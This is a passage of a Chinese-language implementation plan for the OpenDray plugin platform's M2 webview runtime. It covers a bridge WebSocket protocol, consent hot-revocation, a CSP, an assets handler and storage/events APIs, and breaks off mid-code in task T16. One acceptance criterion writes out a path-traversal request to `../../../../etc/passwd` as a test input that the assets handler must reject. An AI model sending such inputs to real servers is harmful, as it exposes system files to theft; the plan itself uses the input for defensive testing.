# 实施计划：OpenDray 插件平台 M2 — Webview 运行时

> 输出文件：`/home/linivek/workspace/opendray/docs/plugin-platform/M2-PLAN.md`
> 设计合约：`/home/linivek/workspace/opendray/docs/plugin-platform/12-roadmap.md` §M2
> 前置任务：M1 已在 `5d1de91` 提交（`kevlab` 分支）完成 — 所有 M1 接口保持锁定。
> 北极星指标：`kanban` 示例在 Android、iOS 和桌面上运行；在运行时撤销 `storage` 权限会导致下一次 `storage.set` 在 200 毫秒内拒绝。

---

## 1. 范围边界

**包含 (M2 合约)：**
- 通过回环 `/api/plugins/{name}/assets/*` 路由分发插件 `ui/` 包（没有非回环的 `plugin://` 方案 — Flutter WebView 将经过认证的网关视为源）。iOS 审核方案得以保留：插件 JS 的每个字节都从本地安装在 `${PluginsDataDir}/<name>/<version>/ui/` 下的包中分发。
- 位于 `/api/plugins/{name}/bridge/ws` 的每个插件的桥接 WebSocket，使用现有的 `gorilla/websocket` 依赖。通过 `plugin/bridge.Gate` (M1) 进行能力门控。强制执行每个连接的速率限制。
- 预加载注入：Flutter WebView 宿主（Android InAppWebView + iOS WKWebView + 桌面 `webview_flutter`）注入 `window.opendray` SDK 填充（shim），将每次调用通过 `postMessage` → WS 信封进行管道传输。
- 三个端到端连接的新贡献点：`contributes.activityBar`、`contributes.views`、`contributes.panels`。Flutter 渲染活动栏轨道、视图宿主（webview + 声明式）和底部面板插槽。
- 三个生效的桥接命名空间：`opendray.workbench.*`（无需能力）、`opendray.storage.*`（需要 `storage` 能力）、`opendray.events.*`（订阅需要 `events` 能力；始终允许在自己的前缀下发布）。
- 能力热撤销：删除 `plugin_consents` 行（或通过新的 `DELETE /api/plugins/{name}/consents/{cap}` 撤销单个能力）会发布 `consentChanged` 发布/订阅事件；活跃的桥接套接字在下次调用时刷新缓存的同意信息，并主动终止针对已撤销能力的任何在途订阅。从数据库删除到下次 `storage.set` 响应 `EPERM` 的 SLO 为 200 毫秒。
- CSP 强制执行：每个资产响应都设置 `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; img-src 'self' data: blob:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'`。`unsafe-eval` 限于插件 WebView（React/Vue 等框架需要它）；宿主 Flutter 壳保持其默认 CSP 不变。
- 每个插件的 WebView 隔离：每个视图 id 一个 WebView 控制器，数据存储在平台允许的每个插件的 cookie+缓存分区下（Android WebView `setDataDirectorySuffix`，iOS WKWebView 唯一的 `WKProcessPool` + `WKWebsiteDataStore`）。
- 位于 `plugins/examples/kanban/` 下的看板参考插件，练习 活动栏 → 视图 (webview) → storage + workbench.showMessage + events.subscribe。
- 热注册：`POST /api/plugins/install/confirm` 已经触发 `Runtime.Register` (M1)，它会推送到 `contributions.Registry`。M2 增加了服务器发送的流 `/api/workbench/contributions/stream` (SSE)，以便 Flutter 可以在不重新加载页面的情况下重绘活动栏/视图。桌面端和移动端都重用同一个 `WorkbenchService` 接收器。

**排除 — 列举的延迟项以保持 M2 在预算内：**

| 诱人的蔓延项 | 延迟至 |
|---|---|
| `opendray.fs.*`、`opendray.exec.*`、`opendray.http.*`、`opendray.session.*`、`opendray.secret.*`、`opendray.ui.*`、`opendray.commands.execute`、`opendray.tasks.*`、`opendray.clipboard.*`、`opendray.llm.*`、`opendray.git.*`、`opendray.telegram.*`、`opendray.logger.*` | **M3** (fs/exec/http 需要管理器工作) / **M5** (其余项：由 HTTP API 上已存在的功能工作门控) |
| 宿主边车管理器、JSON-RPC 2.0 stdio、LSP 帧、`contributes.languageServers` | **M3** |
| 市场获取、签名验证、撤销轮询、`opendray plugin publish` | **M4** |
| 针对插件作者的热重载、便携式 `opendray-dev`、桥接追踪工具、本地化 | **M6** |
| 运行时同意切换 **UI**（设置面板）。API + 强制执行在 M2 中发布；Flutter 切换开关在 M2 的最终完善任务 (T24) 中落地 — 没有单独的设置页面重新设计。 | 包含在 M2 范围内 |
| 多视图分割布局、固定、除 “点击图标 → 显示视图” 之外的滑动操作 | **v1 之后** |
| 主题 JSON 文件、editorActions、sessionActions、telegramCommands、agentProviders、debuggers、languages、taskRunners 贡献点 | **v1 之后 / M5** |
| 用 WS 频道复用替换 SSE | **M6** |
| 插件对插件的命令导出 | **v1 之后** |

---

## 2. 任务图

> **惯例：** 每个任务都有 T# id、依赖列表、待创建/修改的文件（绝对路径）、核心类型/签名、验收标准、测试、复杂度 S/M/L、风险。

### T1 — 使用 activityBar / views / panels 扩展 `ContributesV1`
- **依赖：** 无
- **修改：** `/home/linivek/workspace/opendray/plugin/manifest.go` — 向 `ContributesV1` 添加可选字段 `ActivityBar []ActivityBarItemV1`、`Views []ViewV1`、`Panels []PanelV1`。添加新结构体。
- **核心类型：**
  ```go
  type ActivityBarItemV1 struct {
      ID     string `json:"id"`
      Icon   string `json:"icon"`    // 相对于插件 ui/ 的资产路径或 emoji
      Title  string `json:"title"`
      ViewID string `json:"viewId,omitempty"`
  }
  type ViewV1 struct {
      ID        string `json:"id"`
      Title     string `json:"title"`
      Container string `json:"container,omitempty"` // "activityBar" | "panel" | "sidebar"
      Icon      string `json:"icon,omitempty"`
      When      string `json:"when,omitempty"`
      Render    string `json:"render,omitempty"`    // "webview" | "declarative"
      Entry     string `json:"entry,omitempty"`     // 针对 webview：ui/ 下的相对路径
  }
  type PanelV1 struct {
      ID       string `json:"id"`
      Title    string `json:"title"`
      Icon     string `json:"icon,omitempty"`
      Position string `json:"position,omitempty"`   // "bottom" | "right"
      Render   string `json:"render,omitempty"`     // 默认为 "webview"
      Entry    string `json:"entry,omitempty"`
  }
  ```
- **验收：** `go build ./...` 清洁。每个 M1 清单（`plugins/agents/*` + `plugins/panels/*` + `plugins/examples/time-ninja/`）继续保持不变地往返。新字段是 `omitempty`，因此清单字节没有变化。
- **测试：** 使用 `TestLoadManifest_V1Webview` 扩展 `/home/linivek/workspace/opendray/plugin/manifest_v1_test.go`，加载一个包含 `activityBar`/`views`/`panels` 的手动构建清单并断言字段解析；扩展 `TestLoadManifest_LegacyCompat` 以断言所有现有清单继续解析且新字段值均为零。
- **复杂度：** S
- **风险/缓解：** 低。仅为增量。

### T2 — Webview 贡献点验证器
- **依赖：** T1
- **修改：** `/home/linivek/workspace/opendray/plugin/manifest_validate.go` — 扩展 `validateContributes` 以验证 `activityBar[].id/icon/title`（id 正则 `^[a-z0-9._-]+$`，标题 1–48 字符，图标非空）、`views[].{id,title,render,entry,container}`（render ∈ {webview,declarative}；当 render=webview 时，entry 必填且必须是相对路径，不以 `/` 开头且不包含 `..`）、`panels[].{id,title,entry,render,position}`（position ∈ {bottom,right}）。强制执行来自 03-contribution-points.md 的限制：`activityBar ≤ 4`、`views ≤ 8`、`panels ≤ 4`。交叉检查 `activityBarItem.viewId` 在存在时指向已声明的 `views[].id`。
- **验收：** 手动构建的看板清单 (T22) 通过。包含 9 个视图的清单由于 `contributes.views: too many (max 8)` 而失败。`render=webview` 且缺少 `entry` 的视图由于 `contributes.views[0].entry: required when render=webview` 而失败。包含 `..` 的路径由于 `contributes.views[0].entry: must not contain '..'` 而失败。
- **测试：** 使用表驱动案例扩展 `/home/linivek/workspace/opendray/plugin/manifest_validate_test.go`：8 个无效，2 个有效。名称：`TestValidate_Webview_*`。
- **复杂度：** M
- **风险/缓解：** 中 — 交叉引用错误（孤儿 viewId）会悄悄破坏 UI。缓解：显式测试 `TestValidate_ActivityBar_OrphanViewId`。

### T3 — 使用 webview 插槽扩展 `contributions.Registry.Flatten`
- **依赖：** T1
- **修改：** `/home/linivek/workspace/opendray/plugin/contributions/registry.go` — 添加 `OwnedActivityBarItem`、`OwnedView`、`OwnedPanel` 包装器（结构体嵌入 + `PluginName`）。使用 `ActivityBar []OwnedActivityBarItem`、`Views []OwnedView`、`Panels []OwnedPanel` 扩展 `FlatContributions`。扩展 `Flatten()` 以填充并排序它们（activityBar 按优先级排序 — 稍后添加 — 目前按 PluginName 然后 ID；视图/面板类似）。扩展 `isZero` 以考虑新字段。
- **验收：** 注册看板后，`Flatten().ActivityBar` 有一个条目；`Flatten().Views` 有一个条目；`Flatten().Panels` 为空（看板没有面板）。稳定排序：贡献一个视图的两个插件产生由 (PluginName asc, ID asc) 确定的确定性排序。
- **测试：** 扩展 `/home/linivek/workspace/opendray/plugin/contributions/registry_test.go` — `TestFlatten_ActivityBar_Views_Panels_Sorted`、`TestFlatten_ZeroIfOnlyWebviewFieldsEmpty`，并发 set/remove 仍通过 `-race`。
- **复杂度：** S
- **风险/缓解：** 低。JSON 传输格式是增量性的；空切片为默认值，因此旧的 Flutter 客户端继续工作。

### T4 — 为旧版面板插件扩展兼容性合成器
- **依赖：** T3
- **修改：** `/home/linivek/workspace/opendray/plugin/compat/synthesize.go` — 当 `p.Type == "panel"` 时，合成一个具有 `id=p.Name`、`title=p.DisplayName`、`container="activityBar"`、`render="declarative"` 的内存中 `contributes.views[]` 条目（没有入口路径；现有的面板代码继续通过旧版 HTTP API 进行渲染 — 视图条目纯粹是为了让 Flutter 工作台可以将其包含在活动轨道中以便发现）。为了 M2 完善，旧版面板**不会**通过新的视图宿主路由 — 它们保持其现有的定制组件。合成视图条目仅为元数据。
- **验收：** 所有 11 个现有的面板清单在加载后每个都会生成一个合成视图。磁盘上的清单字节无变化。现有的面板 UI 继续保持不变地渲染（保持 M1 字节级行为）。
- **测试：** 扩展 `/home/linivek/workspace/opendray/plugin/compat/synthesize_test.go` — `TestSynthesize_PanelGetsView`、`TestSynthesize_AgentDoesNotGetView`、`TestCompat_LegacyPanelUIUntouched`（在 `GET /api/providers` 上进行黄金文件测试）。
- **复杂度：** S
- **风险/缓解：** 低。合成视图仅供发现；渲染路径无变化。

### T5 — 桥接协议信封包
- **依赖：** 无 (与 T1–T4 并行)
- **创建：** `/home/linivek/workspace/opendray/plugin/bridge/protocol.go`、`/home/linivek/workspace/opendray/plugin/bridge/protocol_test.go`
- **核心类型/签名：** (参见 §11 了解完整协议规范)
  ```go
  const ProtocolVersion = 1

  type Envelope struct {
      V      int             `json:"v"`
      ID     string          `json:"id,omitempty"`
      NS     string          `json:"ns,omitempty"`
      Method string          `json:"method,omitempty"`
      Args   json.RawMessage `json:"args,omitempty"`
      Result json.RawMessage `json:"result,omitempty"`
      Error  *WireError      `json:"error,omitempty"`
      Stream string          `json:"stream,omitempty"` // "chunk" | "end"
      Data   json.RawMessage `json:"data,omitempty"`
      Token  string          `json:"token,omitempty"`
  }
  type WireError struct {
      Code    string          `json:"code"`    // EPERM|EINVAL|ENOENT|ETIMEOUT|EUNAVAIL|EINTERNAL
      Message string          `json:"message"`
      Data    json.RawMessage `json:"data,omitempty"`
  }
  func NewOK(id string, result any) (Envelope, error)
  func NewErr(id, code, msg string) Envelope
  func NewStreamChunk(id string, data any) (Envelope, error)
  func NewStreamEnd(id string) Envelope
  ```
- **验收：** 每个信封都通过 `json.Marshal` / `json.Unmarshal` 往返传输，输出位级一致。线缆上的未知字段在相关处通过 `json.RawMessage` 保留（面向未来）。
- **测试：** 表驱动的往返传输 + 每个错误代码/流状态的黄金文件。
- **复杂度：** S
- **风险/缓解：** 低。M2 发布后更改此形状是破坏性变更 — 尽早冻结。

### T6 — 桥接连接管理器 + 同意热撤销总线
- **依赖：** T5
- **创建：** `/home/linivek/workspace/opendray/plugin/bridge/manager.go`、`/home/linivek/workspace/opendray/plugin/bridge/manager_test.go`
- **核心类型/签名：**
  ```go
  // Manager 拥有所有活跃的桥接 WebSocket 连接以及一个用于同意失效的发布/订阅总线。
  type Manager struct{ /* 未导出 */ }
  func NewManager(gate *Gate, log *slog.Logger) *Manager
  // 注册新升级的连接。返回带有 Close 方法的 Conn，
  // 该方法将 conn 从管理器中移除并清除其拥有的任何未完成订阅。
  func (m *Manager) Register(plugin string, c *Conn)
  func (m *Manager) Unregister(plugin string, c *Conn)
  // InvalidateConsent 发布一个热撤销事件。插件的每个活跃 Conn
  // 要么 (a) 终止匹配的在途订阅，要么 (b) 为其下一次调用标记重新检查。SLO 200 毫秒。
  func (m *Manager) InvalidateConsent(plugin string, cap string)
  // OnConsentChanged 返回一个频道，向关心的订阅者
  //（例如活跃的 events.subscribe 循环）传递撤回事件。
  func (m *Manager) OnConsentChanged(plugin string) <-chan ConsentChange

  type Conn struct {
      Plugin   string
      ws       *websocket.Conn      // gorilla/websocket
      writeMu  sync.Mutex
      subs     *subRegistry         // 每个连接的 events.subscribe 追踪器
      /* ... */
  }
  func (c *Conn) WriteEnvelope(Envelope) error  // 序列化写入
  func (c *Conn) Close(code int, reason string) error
  ```
- **验收：** 活跃的 `Conn` 在 5 毫秒内 (p99) 观察到 `InvalidateConsent("kanban","storage")`。Conn 的匹配 `storage` 的 `subs` 以 `stream:"end"` 信封和最终的 `error:{code:"EPERM"}` 信封关闭。并发 Register/Unregister 在 `-race` 下安全。
- **测试：** `TestManager_HotRevokeDeliversUnderSLO` 使用 `testing/synctest`（或 time.Sleep + deadline）断言从 InvalidateConsent 到 Conn 可见的撤回信号 ≤200 毫秒。
- **复杂度：** M
- **风险/缓解：** 中 — 争用下的广播分发。缓解：每个连接缓冲频道 + 背压时丢弃最旧数据（记录警告，绝不阻塞总线）。

### T7 — 桥接 WebSocket 处理程序
- **依赖：** T5, T6, T9 (命名空间生效以响应) — 但处理程序本身可以先带桩处理程序落地 (参见 §9 第一个 PR 缝隙)
- **创建：** `/home/linivek/workspace/opendray/gateway/plugins_bridge.go`、`/home/linivek/workspace/opendray/gateway/plugins_bridge_test.go`
- **修改：** `/home/linivek/workspace/opendray/gateway/server.go` — 在受保护组中添加 `r.Get("/api/plugins/{name}/bridge/ws", s.pluginsBridgeWS)`。向 `Server` + `Config` 添加 `bridgeMgr *bridge.Manager`。
- **核心类型/函数：**
  ```go
  func (s *Server) pluginsBridgeWS(w http.ResponseWriter, r *http.Request)
  // 流程：
  //  1. chi.URLParam(r, "name") → 插件名称。
  //  2. 断言 plugins.Runtime 拥有此插件 + 同意行存在（否则 404）。
  //  3. 通过现有的 gorilla 升级器升级（源检查：参见 §4.3）。
  //  4. 构建 bridge.Conn，在 Manager 注册。
  //  5. 启动读取协程：解码信封，通过分发器进行分发。
  //  6. 关闭时，Unregister，清除订阅。
  // 请求信封处理：
  //   - v != 1 → 响应错误 EINVAL
  //   - 未知命名空间 → 响应 EUNAVAIL
  //   - 已知命名空间下的未知方法 → 响应 EUNAVAIL
  //   - 能力拒绝 → 响应 EPERM
  //   - 超出速率限制 → 响应 ETIMEOUT + retryAfter (ms)
  ```
- **速率限制：** 来自 04-bridge-api.md §速率限制 的每个插件每分钟配额。在内存中通过 `bridge.rateLimiter` (新的、轻量级的) 进行桶处理。
- **源/认证：** WS 连接需要来自 Flutter 宿主的有效 JWT cookie/bearer + `Origin` 必须为 `app://opendray` (移动端) 或配置的前端宿主或 `http://localhost:<port>` 或 `http://127.0.0.1:<port>`。否则在升级前拒绝并返回 HTTP 403。
- **验收：** `wscat -H "Authorization: Bearer $TOKEN" ws://localhost:8080/api/plugins/kanban/bridge/ws` → 针对 `{v:1,id:"1",ns:"unknown",method:"x"}` 回显 `EUNAVAIL`，并针对格式良好的请求返回有效的 `workbench.showMessage` OK (在 T10 落地后)。
- **测试：** `TestBridgeWS_HandshakeRequiresAuth`、`TestBridgeWS_UnknownNsReturnsEUNAVAIL`、`TestBridgeWS_ClosedOnUninstall`、`TestBridgeWS_ConcurrentCallsSerialiseOK`（100 个协程发布信封；全部得到响应；无竞争）。
- **复杂度：** L
- **风险/缓解：** 高 — WS 连接泄漏，同时关闭+写入时死锁。缓解：与 WS 寿命绑定的 `context.Context`，每个 Conn 的写操作 `sync.Mutex`，gorilla 内置的读/写期限 (配置 60s)，在 `-race` 下测试。

### T8 — 资产处理程序 (`/api/plugins/{name}/assets/*`)
- **依赖：** 无 (与 T1–T7 并行)
- **创建：** `/home/linivek/workspace/opendray/gateway/plugins_assets.go`、`/home/linivek/workspace/opendray/gateway/plugins_assets_test.go`
- **修改：** `/home/linivek/workspace/opendray/gateway/server.go` — 在受保护组中添加 `r.Get("/api/plugins/{name}/assets/*", s.pluginsAssets)` (JWT 中间件自动运行)。
- **核心类型/函数：**
  ```go
  // pluginsAssets 从 ${PluginsDataDir}/<name>/<version>/ui/ 提供静态文件。
  // - 使用作用域限于插件 ui 目录的 http.FileServer。
  // - 通过向 Runtime 查询活跃版本来解析 <version>。
  // - 对每个响应应用 CSP + X-Content-Type-Options + X-Frame-Options。
  // - 拒绝任何包含 ".." 的路径（纵深防御；http.ServeFile 已经会清理，但我们显式短路返回 400）。
  // - 从扩展名推断 Content-Type；未知则为 application/octet-stream。
  func (s *Server) pluginsAssets(w http.ResponseWriter, r *http.Request)
  ```
- **CSP 标头 (确切)：**
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; img-src 'self' data: blob:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'
  ```
- **验收：** `GET /api/plugins/kanban/assets/index.html` → 200，内容与包匹配；存在 CSP 标头；`GET .../assets/../../../../etc/passwd` → 400 EBADPATH。
- **测试：** 表驱动：快乐路径 HTML + JS + CSS + 图像，路径遍历 400，缺少文件 404，缺少插件 404，认证错误 401。黄金文件 CSP 标头值 (字节级精确)。
- **复杂度：** M
- **风险/缓解：** 中 — 通过 unicode 技巧进行路径遍历。缓解：`filepath.Clean` + `strings.Contains(".." )` + `http.Dir` 根路径设置；带有 12 个攻击字符串的专用 `TestAssets_TraversalAttempts`。

### T9 — Workbench API 命名空间
- **依赖：** T5, T6
- **创建：** `/home/linivek/workspace/opendray/plugin/bridge/api_workbench.go`、`api_workbench_test.go`
- **核心类型/函数：**
  ```go
  // WorkbenchAPI 在服务端实现 opendray.workbench.*。
  // 无需能力（workbench 是 UX）。
  type WorkbenchAPI struct {
      showMsg ShowMessageSink   // 注入 — Flutter 通过单独的频道推入 SnackBar
      /* ... */
  }
  // ShowMessageSink 是让网关路由宿主到 Flutter 消息的接口（与插件桥接带外）。
  // 在网关中实现为每个用户的 SSE 流 (T15)。
  type ShowMessageSink interface {
      ShowMessage(userID string, msg string, opts ShowMessageOpts) error
  }
  // Dispatch 是由桥接处理程序调用的单一入口。
  func (w *WorkbenchAPI) Dispatch(ctx context.Context, plugin, method string, args json.RawMessage) (result any, err error)
  ```
- **M2 中生效的方法：** `showMessage`、`confirm`（在 M2 中桌面端返回 false + EUNAVAIL 备注 — 弹出一个简单的 “确定” SnackBar）、`prompt` (EUNAVAIL)、`openView`（发布到 Flutter 监听的每个用户的频道）、`updateStatusBar`（改变插件的内存 `statusBar` 覆盖并通过 SSE 流 T15 广播，以便 Flutter 重绘）、`runCommand`（通过 M1 分发器发布）、`theme`（返回当前主题 id）、`onThemeChange`（通过事件总线订阅事件）。
- **验收：** WS 上的 `opendray.workbench.showMessage("hi")` 在 50 毫秒内返回 `{result:null}`，且 Flutter 通过 SSE 流渲染 SnackBar。
- **测试：** 使用模拟的 `ShowMessageSink` 对每个方法进行单元测试；`TestWorkbench_UpdateStatusBar_BroadcastsSSE`。
- **复杂度：** M
- **风险/缓解：** 中 — SnackBar 分发频道不得在多租户部署中的用户之间泄漏（OpenDray 是单用户的，但要面向未来）。缓解：由来自 JWT 的用户 id 键入的接收器。

### T10 — Storage API 命名空间 + `plugin_kv` 写入者
- **依赖：** T5, T6
- **创建：** `/home/linivek/workspace/opendray/plugin/bridge/api_storage.go`、`api_storage_test.go`、`/home/linivek/workspace/opendray/kernel/store/plugin_kv.go`、`plugin_kv_test.go`
- **修改：** 无 (M1 迁移 `011_plugin_kv.sql` 已经定义了具有 ON DELETE CASCADE 的表；写入者现在落地)。
- **核心类型/函数：**
  ```go
  // Store 层。
  type PluginKV struct{ PluginName, Key string; Value json.RawMessage; SizeBytes int; UpdatedAt time.Time }
  func (d *DB) KVGet(ctx, name, key string) (json.RawMessage, bool, error)
  func (d *DB) KVSet(ctx, name, key string, value json.RawMessage) error // 强制执行每个键 1 MiB，每个插件 100 MiB
  func (d *DB) KVDelete(ctx, name, key string) error
  func (d *DB) KVList(ctx, name, prefix string) ([]string, error)

  // 桥接 API 层。
  type StorageAPI struct{ db *store.DB; gate *Gate }
  func (s *StorageAPI) Dispatch(ctx, plugin, method string, args json.RawMessage) (any, error)
  // 方法：get(key,fallback?)、set(key,value)、delete(key)、list(prefix?)
  ```
- **能力强制执行：** 每次调用时执行 `Gate.Check(ctx, plugin, Need{Cap:"storage"})`。遇到 EPERM 时，返回 `{error:{code:"EPERM"}}` 信封。
- **配额强制执行：** 当 `len(value) > 1<<20` 时，`KVSet` 以 `EINVAL {message:"value exceeds 1 MiB"}` 拒绝；当插件总大小将超过 100 MiB 时，以 `ETIMEOUT {message:"plugin storage quota exceeded (100 MiB)"}` 拒绝（每个插件的大小被缓存，每次 set 时刷新）。
- **验收：** `opendray.storage.set("k","v")` 持久化；`opendray.storage.get("k")` 返回 `"v"`；在 `DELETE /api/plugins/kanban` 之后，看板的 `plugin_kv` 行级联删除。
- **测试：** 与嵌入式 postgres 的集成：CRUD、配额、级联；使用模拟数据库在 Dispatch 层进行单元测试。
- **复杂度：** M
- **风险/缓解：** 中 — 并发 set 竞争。缓解：PostgreSQL `INSERT … ON CONFLICT (plugin_name,key) DO UPDATE` 原子处理并发写入；`-race` 测试衍生 50 个协程命中同一个键，并断言最后写入者获胜且行数 == 1。

### T11 — Events API 命名空间 + HookBus 桥接
- **依赖：** T5, T6
- **创建：** `/home/linivek/workspace/opendray/plugin/bridge/api_events.go`、`api_events_test.go`
- **核心类型/函数：**
  ```go
  // EventsAPI 将现有的 plugin.HookBus 适配到 v1 events.subscribe 合约。
  type EventsAPI struct{
      bus  *plugin.HookBus    // 现有的 M1 总线
      gate *Gate
      mgr  *Manager
  }
  // Dispatch 处理 subscribe (返回流 id)、publish (以 plugin.<name>.* 为前缀写入总线)、unsubscribe。
  func (e *EventsAPI) Dispatch(ctx, plugin, method string, args json.RawMessage, conn *Conn) (any, error)
  ```
- **映射 (根据 04-bridge-api.md §events)：**
  - `session.output` ← `HookOnOutput`
  - `session.idle` ← `HookOnIdle`
  - `session.start` ← `HookOnSessionStart`
  - `session.stop` ← `HookOnSessionStop`
  - `plugin.<name>.*` → 照原样通过总线发布；发布时作用域限于自己的前缀
- **模式检查：** `events.subscribe(name)` 通过新的匹配器 `MatchEventPattern(patterns, name string) bool` (点分隔段内的 glob `*`) 验证 `name` 是否匹配插件授予的 `permissions.events` 中的 ≥1 个模式。Gate 中的能力键为 `"events"`，Need.Target 是用户请求的事件名称模式。
- **订阅机制：** `EventsAPI.Dispatch("subscribe", {name:"session.*"})` 注册一个 `HookBus.SubscribeLocal`，它将每个事件作为 `{stream:"chunk", data:<event>, id:<subId>}` 通过 `conn.WriteEnvelope` 推送。Unsubscribe 取消返回的 `func()`。
- **热撤销：** 在 `InvalidateConsent(plugin,"events")` 时，管理器的 Close 路径遍历连接的订阅集并针对每个订阅 id 发送 `{stream:"end", error:{code:"EPERM"}}`。
- **验收：** 具有 `permissions.events:["session.*"]` 的插件订阅 `session.output`；发出会话事件会在 100 毫秒内交付一个块信封。在没有模式匹配的情况下订阅 `fs.*` → EPERM。
- **测试：** `TestEvents_SubscribeCapGate`、`TestEvents_PublishScopedToPluginPrefix`、`TestEvents_RevokeClosesStream`。
- **复杂度：** M
- **风险/缓解：** 中 — 连接关闭时订阅泄漏。缓解：`Conn.subs` 严格由 Conn 拥有；`Conn.Close` 遍历并调用 unsubscribe；通过 `runtime.NumGoroutine` 增量进行断言测试 `TestEvents_NoGoroutineLeakAfterClose`。

### T12 — 同意撤销端点 + Runtime 挂钩
- **依赖：** T6, T10 (storage 首先使用它), T11
- **创建：** `/home/linivek/workspace/opendray/gateway/plugins_consents.go`、`plugins_consents_test.go`
- **修改：** `/home/linivek/workspace/opendray/kernel/store/plugin_consents.go` — 添加 `UpdateConsentPerms(ctx, name, perms json.RawMessage) error`。`/home/linivek/workspace/opendray/gateway/server.go` — 添加路由。
- **添加的路由：**
  ```
  DELETE /api/plugins/{name}/consents/{cap}  → 从 perms JSON 撤销单个能力，发布到 bridgeMgr
  DELETE /api/plugins/{name}/consents        → 全部撤销（删除同意行，卸载会有效禁用）
  GET    /api/plugins/{name}/consents        → 返回当前 perms JSON
  ```
- **单项能力撤回语义：** 加载 `perms_json`，反序列化，将目标键清零（例如 `storage:false` 或 `exec:null`，或完全移除该键），重新序列化，`UpdateConsentPerms`。然后调用 `bridgeMgr.InvalidateConsent(name, cap)`，以便在途 WS 订阅终止。
- **SLO 测量：** T12 包含一个 e2e 测试 `TestRevoke_StorageWithin200ms`，它 (1) 打开 WS，(2) POST 一个 `storage.set` 进行预热，(3) 发出 `DELETE /api/plugins/kanban/consents/storage`，(4) 再次 POST 一个 `storage.set`，(5) 断言第二次响应在 ≤200 毫秒实际耗时内到达且带有 `code:"EPERM"`。使用 `-race` 运行。
- **验收：** 端点返回 200，数据库行的 perms JSON 已更新，下次调用 EPERM ≤200 毫秒。
- **测试：** 同上 + 能力在 perms 中不存在 → 200 无操作；未知插件 → 404；允许列表之外的能力 ("banana") → 400 EINVAL。
- **复杂度：** M
- **风险/缓解：** 高 (SLO 门控)。缓解：在 `InvalidateConsent` 上同步广播；通过在每次 Gate 调用时检查 `atomic.Pointer[map[string]bool]` 脏能力映射实现每个 Conn 撤回原子化。

### T13 — 命令分发器获得 `openView`
- **依赖：** T9 (workbench.openView 存在), T3 (注册表了解视图)
- **修改：** `/home/linivek/workspace/opendray/plugin/commands/dispatcher.go` — 将 M1 中针对 `kind=openView` 的 `EUNAVAIL` 路径替换为具体的处理程序，该处理程序：
  1. 验证 `viewId` 指向一个已注册视图（`contributions.Registry.HasView(plugin, viewId)` — T3 中添加到 Registry 的新方法）。
  2. 通过 Flutter 监听的同一个 SSE 流发出 `ShowMessageSink.OpenView(user, plugin, viewId)`（与 `workbench.showMessage` 相同的频道）。
  3. 在 HTTP 响应中返回 `{kind:"openView", pluginName, viewId}`，以便桌面/Web 测试可以进行断言。
- **验收：** 当命令具有 `run.kind="openView"` 时，`POST /api/plugins/kanban/commands/kanban.show/invoke` 返回 200 且 Flutter 切换到看板视图。
- **测试：** `TestDispatcher_OpenView_UnknownViewReturnsEINVAL`、`TestDispatcher_OpenView_PostsToSSE`。
- **复杂度：** S
- **风险/缓解：** 低。

### T14 — SSE 流 `/api/workbench/stream`
- **依赖：** T9, T13, T6
- **创建：** `/home/linivek/workspace/opendray/gateway/workbench_stream.go`、`workbench_stream_test.go`
- **修改：** `/home/linivek/workspace/opendray/gateway/server.go` — 在受保护组中注册 `r.Get("/api/workbench/stream", s.workbenchStream)`。向 `Server` 添加 `workbenchBus *WorkbenchBus` (新)。
- **核心类型/函数：**
  ```go
  // WorkbenchBus 是从宿主 → Flutter 针对带外通知
  //（showMessage, openView, updateStatusBar, contributionsChanged）的传出频道。
  type WorkbenchBus struct{ /* 通过 slog 友好的频道进行扇出 */ }
  func (b *WorkbenchBus) Publish(ev WorkbenchEvent)
  type WorkbenchEvent struct {
      Kind string          `json:"kind"` // "showMessage" | "openView" | "updateStatusBar" | "contributionsChanged" | "theme"
      Plugin string        `json:"plugin,omitempty"`
      Payload json.RawMessage `json:"payload"`
  }
  func (s *Server) workbenchStream(w http.ResponseWriter, r *http.Request)
  ```
- **线缆格式：** 每个事件为 SSE `data: {<json>}\n\n`；每 20 秒作为 `:\n\n` 发送心跳。
- **验收：** 多个客户端可以并发订阅；客户端断开连接时自动取消订阅（读取结束，总线丢弃频道）。`contributionsChanged` 在每次 `Runtime.Register`/`Runtime.Remove` 之后触发，以便 Flutter 重新获取。
- **测试：** `TestStream_FanoutTwoClients`、`TestStream_ClosesOnDisconnect`、`TestStream_HeartbeatEvery20s`。
- **复杂度：** M
- **风险/缓解：** 中 — 客户端放弃连接时协程泄漏。缓解：与协程绑定的 `r.Context().Done()`；`-race` 测试。

### T15 — `Installer.Confirm` + `Runtime.Register`/`Remove` 发布 contributionsChanged
- **依赖：** T14
- **修改：** `/home/linivek/workspace/opendray/plugin/install/install.go` — 通过函数式选项注入 `WorkbenchBus`；在 Confirm 中 `Runtime.Register` 返回 OK 后，发布 `{kind:"contributionsChanged", plugin:name}`。在 Uninstall 中 `Runtime.Remove` 之后同样处理。`/home/linivek/workspace/opendray/plugin/runtime.go` — 暴露总线的 setter (或通过选项传递；现有的 `contributionsReg` 模式是模板)。
- **验收：** 安装看板会导致 Flutter 在 `/install/confirm` 返回后 200 毫秒内收到一个 SSE 事件；工作台组件重绘活动栏。
- **测试：** 使用 `TestInstall_EmitsContributionsChanged` 扩展 `/home/linivek/workspace/opendray/gateway/plugins_install_test.go`。
- **复杂度：** S

### T16 — Flutter: WebView 宿主组件
- **依赖：** T8 (资产服务器), T7 (桥接 WS)
- **创建：** `app/lib/features/workbench/webview_host.dart`、`app/lib/features/workbench/plugin_bridge_channel.dart`
- **修改：** `app/lib/app.yaml` — 添加 (或确认) `webview_flutter: ^4.13.1` (已存在)，添加 `webview_flutter_android: ^4.7.0` 和 `webview_flutter_wkwebview: ^3.20.0` 以便在 Android/iOS 上进行针对每个插件的数据存储控制。针对桌面端 Linux/Windows，添加 `webview_windows: ^0.4.0` 和 `desktop_webview_window: ^0.2.3`（单一跨平台路径会更理想；webview_flutter 官方仅支持 iOS + Android — **T16 将发布 iOS + Android + web 版；桌面 webview 是 T16b，如下，被标记为已知差距**）。
- **核心组件：**
  ```dart
  class PluginWebView extends StatefulWidget {
    final String pluginName;
    final String viewId;
    final String entryPath;        // 来自 contributes.views[].entry
    final String baseUrl;          // 例如 "http://localhost:8080" (开发版) 或 Flutter 宿主的网关
